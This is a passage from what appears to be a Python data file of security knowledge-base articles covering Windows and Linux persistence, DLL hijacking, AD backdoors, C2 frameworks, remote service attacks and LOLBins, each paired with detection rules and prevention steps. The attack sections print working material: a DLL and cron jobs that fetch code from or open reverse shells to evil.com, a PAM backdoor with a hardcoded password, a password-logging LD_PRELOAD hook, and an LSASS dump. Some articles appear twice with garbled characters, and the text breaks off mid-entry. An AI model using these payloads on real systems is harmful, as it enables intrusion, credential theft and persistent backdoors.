        "title": "Windows Persistence Mechanisms — Registry, Services, Scheduled Tasks, WMI Events",
        "tags": ["persistence", "windows", "registry", "scheduled-tasks", "WMI", "T1547", "T1053", "T1543"],
        "content": r"""# Windows Persistence Mechanisms — Registry, Services, Scheduled Tasks, WMI Events

## Overview

Persistence ensures access survives reboots, credential changes, and user log-offs. Windows offers dozens of persistence locations, each with different detection characteristics.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1547.001 | Boot or Logon Autostart: Registry Run Keys | Persistence |
| T1543.003 | Create or Modify System Process: Windows Service | Persistence |
| T1053.005 | Scheduled Task/Job: Scheduled Task | Persistence |
| T1546.003 | WMI Event Subscription | Persistence |

## Registry Run Keys

```powershell
# HKCU (no admin needed)
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Users\\user\\AppData\\Roaming\\update.exe"

# HKLM (admin required)
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WinDef /t REG_SZ /d "C:\\Windows\\Temp\\svchost.exe"

# Winlogon Userinit hijack
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /t REG_SZ /d "userinit.exe, C:\\temp\\backdoor.exe"
```

## Windows Services

```cmd
sc create "WindowsTimeSync" binPath= "C:\\Windows\\Temp\\payload.exe" start= auto
sc description "WindowsTimeSync" "Windows Time Synchronisation Service"
sc start "WindowsTimeSync"
```

## Scheduled Tasks

```powershell
# Via schtasks.exe
schtasks /create /tn "MicrosoftEdgeUpdateTaskMachineUA" /tr "powershell.exe -w hidden -enc BASE64" /sc onlogon /ru SYSTEM

# Via PowerShell (harder to detect)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -enc BASE64PAYLOAD"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "OneDriveCloudSync" -Action $action -Trigger $trigger -Principal $principal
```

## WMI Event Subscriptions (Fileless)

```powershell
# Filter: trigger on system uptime
$Filter = Set-WmiInstance -Class __EventFilter -Namespace root/subscription -Arguments @{
    Name = "SystemStartFilter"
    EventNamespace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 325"
}

# Consumer: execute payload
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription -Arguments @{
    Name = "SystemStartConsumer"
    CommandLineTemplate = "powershell.exe -w hidden -enc BASE64PAYLOAD"
}

# Binding
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subscription -Arguments @{
    Filter = $Filter; Consumer = $Consumer
}
```

## Detection Opportunities

```kql
// Registry run key write (Sysmon Event 13)
event.code: "13" AND
registry.path: ("*CurrentVersion\\Run*" OR "*Winlogon*") AND
NOT process.name: ("msiexec.exe" OR "setup.exe")

// New service (Event 7045)
winlog.event_id: 7045 AND
NOT winlog.event_data.ServiceFileName: ("C:\\Windows\\*" OR "C:\\Program Files\\*")

// Scheduled task created (Event 4698)
winlog.event_id: 4698 AND
NOT winlog.event_data.TaskName: ("\\Microsoft\\Windows\\*")

// WMI subscription (Event 5861)
winlog.event_id: 5861
```

## Prevention

1. **Autoruns (Sysinternals)**: Regular review of all autostart locations
2. **FIM**: Alert on new files in %TEMP%, %APPDATA%
3. **EDR**: Modern EDRs detect all persistence mechanisms above
4. **AppLocker/WDAC**: Prevent execution from user-writable paths
5. **Service hardening**: Require signed service binaries
6. **WMI monitoring**: Alert on new permanent WMI subscriptions
""",
    },
    {
        "title": "DLL Hijacking and Search Order Abuse",
        "tags": ["dll-hijacking", "search-order", "T1574.001", "T1574.002", "persistence", "privesc"],
        "content": r"""# DLL Hijacking and Search Order Abuse

## Overview

DLL hijacking exploits the Windows DLL search order to execute a malicious DLL instead of a legitimate one. It achieves both privilege escalation and persistence.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1574.001 | DLL Search Order Hijacking | Defence Evasion / Persistence |
| T1574.002 | DLL Side-Loading | Defence Evasion / Persistence |

## Windows DLL Search Order

```
1. Directory containing the calling EXE
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Current working directory
6. Directories in %PATH%
```

If the EXE's directory is user-writable and the DLL doesn't exist in System32, an attacker can plant a malicious DLL there.

## Finding Opportunities

```powershell
# Process Monitor — filter for "NAME NOT FOUND" on DLL loads
# PowerUp
Find-ProcessDLLHijack
Find-PathDLLHijack

# Check %PATH% for writable directories
$env:PATH.Split(";") | ForEach-Object {
    $acl = Get-Acl $_ -ErrorAction SilentlyContinue
    if ($acl) {
        $acl.Access | Where-Object {
            $_.FileSystemRights -like "*Write*" -and $_.IdentityReference -like "*Users*"
        }
    }
}
```

## Malicious DLL Template

```c
// malicious_helper.dll — C DllMain payload
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        WinExec("powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/rev.ps1')", SW_HIDE);
        // Forward to real DLL to avoid crashes:
        LoadLibraryA("C:\\Windows\\System32\\real_helper.dll");
    }
    return TRUE;
}
```

```bash
# Cross-compile
x86_64-w64-mingw32-gcc -shared -o helper.dll malicious.c -lws2_32
```

## DLL Side-Loading

Places a malicious DLL alongside a legitimate signed EXE that loads it — execution appears as the legitimate process.

```
Example: Place malicious version.dll next to signed legitimate.exe
         legitimate.exe loads version.dll from its own directory
         Process looks legitimate in task manager / EDR
```

## Detection Opportunities

```kql
// Sysmon Event 7 — DLL loaded from unexpected path
event.code: "7" AND
dll.path: NOT ("C:\\Windows\\*" OR "C:\\Program Files\\*") AND
process.code_signature.trusted: true

// New DLL in application directory (Sysmon Event 11)
event.code: "11" AND
file.extension: "dll" AND
file.path: NOT ("C:\\Windows\\*" OR "C:\\Program Files\\*") AND
NOT process.name: ("msiexec.exe" OR "setup.exe")
```

## Prevention

1. **SafeDllSearchMode**: `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode = 1`
2. **CWD control**: Privileged processes should not run from user-writable directories
3. **Application directory permissions**: Remove user write access from Program Files subdirs
4. **WDAC**: Require DLL signing — malicious unsigned DLLs blocked
5. **Developers**: Always use full paths in `LoadLibrary` calls
6. **Process Monitor auditing**: Regular checks for NAME NOT FOUND DLL loads
""",
    },
    {
        "title": "Active Directory Persistence — AdminSDHolder, GPO Abuse, SID History",
        "tags": ["AD-persistence", "AdminSDHolder", "GPO-abuse", "SID-history", "T1484", "T1134.005"],
        "content": r"""# Active Directory Persistence — AdminSDHolder, GPO Abuse, SID History

## Overview

AD persistence techniques maintain privileged access even after password resets. They abuse legitimate AD features, making detection and remediation require specific expertise.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1484.001 | Domain Policy Modification: GPO Modification | Defence Evasion / Persistence |
| T1134.005 | SID-History Injection | Privilege Escalation |

## AdminSDHolder Abuse

`AdminSDHolder` ACL is copied to all protected privileged group members every 60 minutes by `SDProp`. By modifying AdminSDHolder's ACL, attackers ensure persistence survives attempts to remove their permissions.

```powershell
# Add backdoor account with GenericAll on AdminSDHolder (PowerView)
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=targetcorp,DC=com' -PrincipalIdentity backdoor_user -Rights All

# After 60 minutes, SDProp runs → backdoor_user has GenericAll on Domain Admins, EA, etc.
# backdoor_user can add themselves to Domain Admins at any time
```

## GPO Abuse

```powershell
# Find GPOs writable by current user
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "Write" -and
    $_.SecurityIdentifier -match (Get-DomainUser lowpriv).objectsid
}

# SharpGPOAbuse — add scheduled task to GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName "WindowsUpdate" \
  --Author "NT AUTHORITY\\SYSTEM" --Command "cmd.exe" \
  --Arguments "/c net user backdoor P@ss123! /add && net localgroup Administrators backdoor /add" \
  --GPOName "Default Domain Policy"
```

## SID History Injection

```powershell
# Inject Enterprise Admin SID into user's SID History
# Requires DA on source domain
privilege::debug
sid::patch
sid::add /sam:backdoor_user /new:S-1-5-21-ROOTDOMAIN-SID-519

# User now has effective Enterprise Admin rights via SID History
# Not a member of any privileged group — harder to detect
```

## Object ACL Backdoors

```powershell
# Grant DCSync rights without adding to privileged groups
Add-DomainObjectAcl -TargetIdentity "DC=targetcorp,DC=com" -PrincipalIdentity backdoor_user -Rights DCSync

# Grant GenericAll on specific DA account
Add-DomainObjectAcl -TargetIdentity "CN=Administrator,CN=Users,DC=targetcorp,DC=com" -PrincipalIdentity backdoor_user -Rights All
# Now backdoor_user can reset DA password at any time
```

## Detection Opportunities

```kql
// AdminSDHolder ACL modification (Event 4662)
winlog.event_id: 4662 AND
winlog.event_data.ObjectDN: "*AdminSDHolder*" AND
winlog.event_data.OperationType: ("WRITE_DAC" OR "WRITE_PROPERTY")

// GPO modification (Event 5136)
winlog.event_id: 5136 AND
winlog.event_data.ObjectClass: "groupPolicyContainer"

// SID History added (Event 4765) — almost never legitimate in production
winlog.event_id: 4765
```

### BloodHound
Regular ingestion reveals new attack paths to DA that didn't exist before — indicating ACL changes.

## Prevention

1. **Monitor AdminSDHolder ACL**: Alert on any modification
2. **Regular ACL audit**: Review rights on domain NC head monthly
3. **GPO permissions audit**: Review write access quarterly
4. **Disable SID History**: Unless actively migrating between domains
5. **Tier 0 monitoring**: Any change to DC/AdminSDHolder should alert immediately
6. **BloodHound Enterprise**: Continuous ACL change tracking
""",
    },
    {
        "title": "Cobalt Strike and C2 Framework Overview (Educational)",
        "tags": ["cobalt-strike", "c2", "command-and-control", "T1071", "T1095", "beacon", "post-exploitation"],
        "content": r"""# Cobalt Strike and C2 Framework Overview (Educational)

## Overview

Understanding C2 frameworks — particularly Cobalt Strike, the most widely abused by ransomware and APT groups — is essential for SOC analysts to detect and respond to intrusions. This article covers how they work from a defensive perspective.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1071.001 | Web Protocols | C2 |
| T1071.004 | DNS | C2 |
| T1573 | Encrypted Channel | C2 |
| T1090 | Proxy | C2 |
| T1055 | Process Injection | Defence Evasion |

## Cobalt Strike Architecture

```
Team Server (attacker VPS)
    │
    │  HTTPS/DNS/SMB (malleable C2 channel)
    ▼
Beacon (implant on victim host)
    │
    ├── Configurable sleep: 60s ± 20% jitter
    ├── Capabilities:
    │     execute-assembly  — run .NET binary in memory
    │     powerpick         — PowerShell without powershell.exe
    │     psinject          — inject PS into arbitrary process
    │     jump psexec/wmi   — lateral movement
    │     hashdump          — dump local hashes
    │     logonpasswords    — Mimikatz credential dump
    │     socks4a           — SOCKS proxy for tunnelling
    │     upload/download   — file transfer
    └── Named pipe for SMB Beacon (internal C2 chain)
```

## Malleable C2 Profiles

Transform Cobalt Strike traffic to mimic legitimate applications:

```
# Amazon profile example — checkins look like Amazon shopping traffic
http-get {
    set uri "/s/ref=nb_sb_noss_1/field-keywords=books";
    client {
        header "Host" "www.amazon.com";
        metadata {
            base64url;
            prepend "session-token=";
            header "Cookie";
        }
    }
}

# Resulting request:
GET /s/ref=nb_sb_noss_1/field-keywords=books HTTP/1.1
Host: www.amazon.com
Cookie: session-token=AAAAAA...  (base64 beacon data)
```

## DNS C2

```
# Beacon data encoded in subdomain queries:
dig AAAAAAAAAA.c2.attacker.com A
# AAAAAAAAAA = base64-encoded C2 data

# Detection: high-volume queries to same SLD with high-entropy subdomains
# Threshold: >50 subdomains per hour to same parent domain
```

## Cobalt Strike Detection Fingerprints

### JA3/JA3S TLS Fingerprinting
```
# Default Cobalt Strike TLS hello has known JA3 hashes:
# 72a589da586844d7f0818ce684948eea
# Feed into Zeek/Suricata for alerting
```

### YARA Memory Scan
```yara
rule CobaltStrike_Beacon {
    strings:
        $s1 = "%s (admin)" fullword ascii
        $s2 = "beacon.dll" ascii nocase
        $pipe = "\\\\.\\pipe\\MSSE-" ascii
    condition:
        2 of them
}
```

### Process Behaviour
```kql
// Unusual process making outbound connection (injection indicator)
event.code: "3" AND
process.name: ("svchost.exe" OR "rundll32.exe" OR "dllhost.exe") AND
NOT destination.ip: (internal_ranges) AND
NOT process.parent.name: ("services.exe" OR "lsass.exe")
```

## Other Common C2 Frameworks

| Framework | Language | Key Feature | Threat Actor Use |
|---|---|---|---|
| Metasploit Meterpreter | Ruby/C | Widely known | Commodity attackers |
| Sliver | Go | Open source CS alt | Growing usage |
| Havoc | C/C++ | EDR evasion focus | APT groups |
| Brute Ratel | C | Designed for EDR evasion | APT29, ransomware |
| Mythic | Python | Modular, many agent types | Red teams |

## Detection Strategy for SOC

1. **JA3/JA3S**: Known C2 TLS fingerprints in Zeek/Suricata
2. **DNS beaconing**: Query frequency analysis to same SLD
3. **Process injection**: Unusual parent-child + network connections
4. **Memory scanning**: YARA rules for Beacon artifacts in EDR
5. **Threat intelligence**: Team server IPs/domains in SIEM blocklists
6. **Malleable profile hunting**: HTTP request pattern matching
""",
    },
    {
        "title": "Linux Persistence — Cron Jobs, SSH Keys, LD_PRELOAD, PAM Backdoors",
        "tags": ["linux-persistence", "cron", "ssh-keys", "LD_PRELOAD", "PAM", "T1053.003", "T1098.004"],
        "content": r"""# Linux Persistence — Cron Jobs, SSH Keys, LD_PRELOAD, PAM Backdoors

## Overview

Linux persistence plants hooks that survive reboots. Each technique targets a different OS layer — requiring layered detection to catch them all.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1053.003 | Scheduled Task/Job: Cron | Persistence |
| T1098.004 | Account Manipulation: SSH Authorized Keys | Persistence |
| T1574.006 | Dynamic Linker Hijacking | Persistence |
| T1556.003 | Modify Authentication Process: PAM | Persistence |

## Cron Jobs

```bash
# User crontab
crontab -e
# Add: */5 * * * * bash -i >& /dev/tcp/evil.com/4444 0>&1

# System-wide (root required)
echo "*/5 * * * * root /tmp/.cache" >> /etc/crontab

# @reboot persistence
(crontab -l; echo "@reboot /tmp/.hidden_beacon &") | crontab -

# Disguise: filename mimicking legitimate cron
cat > /etc/cron.d/apt-daily << 'EOF'
* * * * * root curl -s http://evil.com/beacon.sh | bash 2>/dev/null
EOF
```

## SSH Authorized Keys

```bash
# Add attacker public key — survives password changes
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-rsa AAAA...attacker_key... evil" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Root
echo "ssh-rsa AAAA...key..." >> /root/.ssh/authorized_keys

# Connect:
ssh -i attacker_privkey user@target
```

## LD_PRELOAD Persistence

```c
// Intercept getpass() to capture sudo passwords
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
char *getpass(const char *prompt) {
    char *(*real)(const char*) = dlsym(RTLD_NEXT, "getpass");
    char *pass = real(prompt);
    FILE *f = fopen("/tmp/.log", "a");
    fprintf(f, "%s\n", pass);
    fclose(f);
    return pass;
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /lib/libutil.so.1 preload.c -ldl

# System-wide (root): overrides all processes
echo "/lib/libutil.so.1" >> /etc/ld.so.preload

# Per-user: add to .bashrc
echo "export LD_PRELOAD=/home/user/.lib/libx.so" >> ~/.bashrc
```

## PAM Backdoor (Most Stealthy)

```c
// pam_backdoor.c — hardcoded password accepted for any account
#include <security/pam_modules.h>
#include <string.h>
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password;
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    if (password && strcmp(password, "B@ckd00r2025!") == 0)
        return PAM_SUCCESS;
    return PAM_AUTH_ERR;
}
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
```

```bash
# Compile and install
gcc -fPIC -shared -o /lib/x86_64-linux-gnu/security/pam_env2.so pam_backdoor.c -lpam

# Insert into common-auth BEFORE existing lines
sed -i '1s/^/auth sufficient pam_env2.so\n/' /etc/pam.d/common-auth

# Now: any user + password "B@ckd00r2025!" → authenticated
```

## Detection Opportunities

```bash
# File integrity monitoring
aide --check  # Detects changes to /etc/crontab, /etc/pam.d/*, /etc/ld.so.preload

# Audit rules
auditctl -w /etc/crontab -p wa -k cron_mod
auditctl -w /root/.ssh/authorized_keys -p wa -k ssh_keys
auditctl -w /etc/ld.so.preload -p wa -k preload_mod

# Check LD_PRELOAD manually
cat /etc/ld.so.preload  # should be empty
find /lib/*/security/ -newer /var/lib/dpkg/info/libpam-modules.list  # new PAM modules
```

```kql
// Cron file modification (auditd → SIEM)
audit.type: "SYSCALL" AND audit.file.path: "/etc/crontab"

// New PAM module
audit.type: "CREATE" AND audit.file.path: "/lib/*/security/*.so"

// SSH key write
audit.syscall: "write" AND audit.file.path: "*/authorized_keys"
```

## Prevention

1. **FIM (AIDE/Tripwire)**: Baseline /etc/crontab, /etc/pam.d/, /etc/ld.so.preload
2. **Immutable files**: `chattr +i /etc/crontab /etc/pam.d/sshd`
3. **SSH key policy**: Periodic review and rotation; alert on new authorized_keys additions
4. **Restrict LD_PRELOAD**: SELinux/AppArmor policies
5. **PAM integrity**: Verify with `dpkg --verify libpam*`; alert on new .so in security dir
6. **auditd**: Comprehensive syscall auditing for sensitive file writes
""",
    },
    {
        "title": "Remote Service Exploitation — RDP, SSH, VNC Attacks",
        "tags": ["rdp", "ssh", "vnc", "brute-force", "T1110", "T1021.001", "BlueKeep"],
        "content": r"""# Remote Service Exploitation — RDP, SSH, VNC Attacks

## Overview

Remote access services exposed to the internet are prime targets. Attackers exploit weak credentials, protocol vulnerabilities, and misconfigurations for direct interactive access.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1021.001 | Remote Services: RDP | Lateral Movement |
| T1021.004 | Remote Services: SSH | Lateral Movement |
| T1021.005 | Remote Services: VNC | Lateral Movement |
| T1110.001 | Brute Force: Password Guessing | Credential Access |
| T1190 | Exploit Public-Facing Application | Initial Access |

## RDP Attacks

```bash
# Hydra brute force
hydra -l administrator -P rockyou.txt rdp://10.10.10.50 -t 4 -W 3

# CrackMapExec spray
crackmapexec rdp 10.10.10.0/24 -u users.txt -p passwords.txt
```

### BlueKeep (CVE-2019-0708) — Pre-auth RCE

```bash
# Metasploit (Windows 7 / Server 2008 R2 only)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 10.10.10.50
set TARGET 2
run
# Warning: can cause BSOD — use only on authorised systems
```

### RDP Session Hijacking (No Password)

```cmd
# Requires SYSTEM on target — hijack disconnected session
query session /server:target
tscon 2 /dest:rdp-tcp#0  # Hijack session ID 2, no password needed
```

## SSH Attacks

```bash
# Brute force
hydra -l root -P passwords.txt ssh://10.10.10.50 -t 10

# Username enumeration (CVE-2018-15473, OpenSSH < 7.7)
python ssh_enum.py --username-file users.txt --target 10.10.10.50

# SSH agent forwarding abuse (lateral movement without credentials)
# If victim has forwarded agent to a compromised host:
SSH_AUTH_SOCK=/tmp/ssh-xyz/agent.pid ssh user@internal_host

# Tunnelling / pivoting
ssh -D 1080 user@bastion -N  # SOCKS proxy through SSH
proxychains nmap -sT 10.10.10.0/24
```

## VNC Attacks

```bash
# Scan for VNC services
nmap -sV -p 5900-5910 10.10.10.0/24

# Brute force
hydra -P passwords.txt vnc://10.10.10.50

# Metasploit VNC auth scanner
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 10.10.10.0/24
run

# VNC without password (common misconfiguration)
vncviewer 10.10.10.50::5900
```

## Detection Opportunities

### RDP (Windows Event Logs)
```kql
// Brute force
SecurityEvent
| where EventID == 4625 AND LogonType == 10
| summarize count() by IpAddress, bin(TimeGenerated, 5m)
| where count_ > 10

// External RDP success (LogonType 10 from non-internal IP)
SecurityEvent
| where EventID == 4624 AND LogonType == 10
| where not(IpAddress matches regex @"^10\.|^192\.168\.|^172\.(1[6-9]|2[0-9]|3[01])\.")
```

### SSH (/var/log/auth.log)
```bash
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head
grep "Accepted" /var/log/auth.log | grep -v "192.168."  # external logins
```

## Prevention

1. **Never expose RDP/SSH/VNC directly**: Require VPN + jump host
2. **Patch immediately**: BlueKeep variants are exploited within hours of disclosure
3. **NLA for RDP**: Requires credentials before session establishment
4. **SSH hardening**: `PermitRootLogin no`, `PasswordAuthentication no`, `AllowUsers` whitelist
5. **Fail2ban**: Auto-block IPs after >5 failed auth attempts
6. **VNC**: Always tunnel through SSH or VPN; require strong VNC password
7. **MFA**: Duo/Okta for SSH and RDP authentication
""",
    },
]

# ============================================================
# COLLECTION 3: LATERAL MOVEMENT & PERSISTENCE
# ============================================================

LATERAL_PERSISTENCE = [
    {
        "title": "Lateral Movement Techniques â€” PsExec, WMI, WinRM, RDP, SMB",
        "tags": ["lateral-movement", "psexec", "wmi", "winrm", "rdp", "T1021", "T1570"],
        "content": r"""# Lateral Movement Techniques â€” PsExec, WMI, WinRM, RDP, SMB

## Overview

Lateral movement techniques allow attackers to traverse from one compromised host to others on the network. Each method leaves different forensic artefacts, making detection dependent on which methods an attacker chooses and which logs are collected.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1021.001 | Remote Services: Remote Desktop Protocol | Lateral Movement |
| T1021.002 | Remote Services: SMB/Windows Admin Shares | Lateral Movement |
| T1021.003 | Remote Services: Distributed Component Object Model | Lateral Movement |
| T1021.006 | Remote Services: Windows Remote Management | Lateral Movement |
| T1047 | Windows Management Instrumentation | Execution |
| T1570 | Lateral Tool Transfer | Lateral Movement |

## PsExec (T1021.002)

PsExec (Sysinternals) copies a service binary over SMB, creates a service on the remote host, starts it, and provides an interactive shell.

```powershell
# Sysinternals PsExec
PsExec.exe \\target -u DOMAIN\\admin -p password cmd

# With hash (Impacket)
python3 psexec.py DOMAIN/admin@10.10.10.50 -hashes :NTLM_HASH

# CrackMapExec
crackmapexec smb 10.10.10.50 -u admin -H NTLM_HASH -x "whoami"
```

**Artefacts:**
- Service creation: Event 7045 (System log) on target
- SMB connection: Event 4624 (LogonType 3) + 4648
- Binary dropped: PSEXESVC.exe in C:\\Windows\\ (classic variant)
- Network: SMB (445) + named pipe \\pipe\\svcctl

## WMI (T1047)

WMI allows remote command execution. No binary is dropped on disk.

```powershell
# wmic â€” built-in Windows tool
wmic /node:10.10.10.50 /user:DOMAIN\\admin /password:password process call create "cmd /c whoami"

# Impacket wmiexec (interactive shell, no service creation)
python3 wmiexec.py DOMAIN/admin:password@10.10.10.50

# CrackMapExec WMI
crackmapexec smb 10.10.10.50 -u admin -p password -x "whoami" --exec-method wmiexec
```

**Artefacts:**
- Event 4624 (LogonType 3)
- WMI Activity log Event 5861
- NO service creation, NO binary on disk

## WinRM / PowerShell Remoting (T1021.006)

```powershell
# Interactive session
Enter-PSSession -ComputerName target -Credential (Get-Credential)

# evil-winrm
evil-winrm -i 10.10.10.50 -u admin -p password
evil-winrm -i 10.10.10.50 -u admin -H NTLM_HASH
```

**Artefacts:**
- Event 4624 (LogonType 3)
- PowerShell Script Block Logging (Event 4104)
- Network: TCP 5985/5986

## RDP (T1021.001)

```bash
xfreerdp /u:admin /p:password /v:10.10.10.50 /cert-ignore

# Restricted Admin Mode (PtH capable)
xfreerdp /u:admin /pth:HASH /v:10.10.10.50 /restricted-admin
```

**Artefacts:**
- Event 4624 (LogonType 10 = RemoteInteractive)
- TerminalServices logs
- Network: TCP 3389

## Detection Summary Table

| Method | Key Event IDs | Network Port | Binary on Disk |
|---|---|---|---|
| PsExec | 7045, 4624 (L3) | 445 | Yes |
| WMI | 4624 (L3), 5861 | 135 | No |
| WinRM | 4624 (L3), 4104 | 5985/5986 | No |
| RDP | 4624 (L10), TS logs | 3389 | No |

## Prevention

1. **Host-based firewall**: Block SMB/WMI/WinRM between workstations
2. **Network segmentation**: Workstations isolated â€” no lateral SMB movement
3. **Disable WinRM** on workstations: `Disable-PSRemoting -Force`
4. **RDP restrictions**: Allow only from jump hosts; enable NLA
5. **LAPS**: Unique local admin passwords prevent hash reuse
6. **Privileged Access Workstations**: Admin actions only from dedicated PAWs
""",
    },
    {
        "title": "Living Off the Land â€” Using Built-in OS Tools for Offense",
        "tags": ["LOLBAS", "LOLBins", "living-off-the-land", "T1218", "T1059", "defense-evasion"],
        "content": r"""# Living Off the Land â€” Using Built-in OS Tools for Offense

## Overview

"Living off the land" (LOTL) means using tools already present on the OS for malicious purposes. These are legitimate, signed binaries that often bypass application allowlisting and reduce AV/EDR detection. LOLBAS catalogues hundreds of Windows binaries that can be abused.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1218 | System Binary Proxy Execution | Defense Evasion |
| T1059.001 | PowerShell | Execution |
| T1140 | Deobfuscate/Decode Files | Defense Evasion |
| T1105 | Ingress Tool Transfer | Command and Control |

## File Download

```powershell
# certutil.exe â€” download and decode
certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe
certutil.exe -decode encoded.b64 output.exe

# bitsadmin.exe
bitsadmin /transfer job /download /priority normal http://evil.com/p.exe C:\\temp\\p.exe

# PowerShell
(New-Object Net.WebClient).DownloadFile("http://evil.com/p.exe","C:\\temp\\p.exe")
IEX (New-Object Net.WebClient).DownloadString("http://evil.com/rev.ps1")
```

## Code Execution

```powershell
# mshta.exe â€” execute HTA
mshta.exe http://evil.com/payload.hta

# regsvr32.exe â€” squiblydoo (bypasses AppLocker)
regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll

# rundll32.exe â€” LSASS dump via comsvcs
rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump <PID> C:\\temp\\lsass.dmp full

# msiexec.exe â€” install MSI from URL
msiexec.exe /q /i http://evil.com/payload.msi

# MSBuild.exe â€” execute inline C# tasks
msbuild.exe payload.xml

# InstallUtil.exe â€” execute .NET assembly
InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

## Reconnaissance with Built-ins

```cmd
net view /domain
net group "Domain Admins" /domain
nltest /dclist:targetcorp.com
systeminfo
wmic qfe list brief
cmdkey /list
reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s
```

## Detection Opportunities

```kql
// certutil download
process.name: "certutil.exe" AND process.args: ("-urlcache" OR "-decode")

// Regsvr32 network connection (squiblydoo)
event.code: "3" AND process.name: "regsvr32.exe"

// rundll32 LSASS dump
process.name: "rundll32.exe" AND process.args: ("comsvcs" OR "MiniDump")

// mshta spawned by Office
process.parent.name: ("WINWORD.EXE" OR "EXCEL.EXE") AND process.name: "mshta.exe"
```

## Prevention

1. **WDAC / AppLocker**: Block certutil, mshta, regsvr32 for standard users
2. **ASR Rules**: Target specific LOLBIN abuse patterns
3. **Script Block Logging**: Captures all PowerShell execution
4. **Network egress filtering**: Block LOLBin outbound at proxy/firewall
5. **Constrained Language Mode**: Limits PowerShell when WDAC enforced
6. **LOLBAS reference**: Monitor lolbas-project.github.io for new entries
""",
    },
    {
        "title": "Windows Persistence Mechanisms â€” Registry, Services, Scheduled Tasks, WMI Events",
        "tags": ["persistence", "windows", "registry", "scheduled-tasks", "WMI", "T1547", "T1053", "T1543"],
        "content": r"""# Windows Persistence Mechanisms â€” Registry, Services, Scheduled Tasks, WMI Events

## Overview

Persistence ensures access survives reboots, credential changes, and user log-offs. Windows offers dozens of persistence locations, each with different detection characteristics.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1547.001 | Boot or Logon Autostart: Registry Run Keys | Persistence |
| T1543.003 | Create or Modify System Process: Windows Service | Persistence |
| T1053.005 | Scheduled Task/Job: Scheduled Task | Persistence |
| T1546.003 | WMI Event Subscription | Persistence |

## Registry Run Keys

```powershell
# HKCU (no admin needed)
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Users\\user\\AppData\\Roaming\\update.exe"

# HKLM (admin required)
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WinDef /t REG_SZ /d "C:\\Windows\\Temp\\svchost.exe"

# Winlogon Userinit hijack
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /t REG_SZ /d "userinit.exe, C:\\temp\\backdoor.exe"
```

## Windows Services

```cmd
sc create "WindowsTimeSync" binPath= "C:\\Windows\\Temp\\payload.exe" start= auto
sc description "WindowsTimeSync" "Windows Time Synchronisation Service"
sc start "WindowsTimeSync"
```

## Scheduled Tasks

```powershell
# Via schtasks.exe
schtasks /create /tn "MicrosoftEdgeUpdateTaskMachineUA" /tr "powershell.exe -w hidden -enc BASE64" /sc onlogon /ru SYSTEM

# Via PowerShell (harder to detect)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -enc BASE64PAYLOAD"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "OneDriveCloudSync" -Action $action -Trigger $trigger -Principal $principal
```

## WMI Event Subscriptions (Fileless)

```powershell
# Filter: trigger on system uptime
$Filter = Set-WmiInstance -Class __EventFilter -Namespace root/subscription -Arguments @{
    Name = "SystemStartFilter"
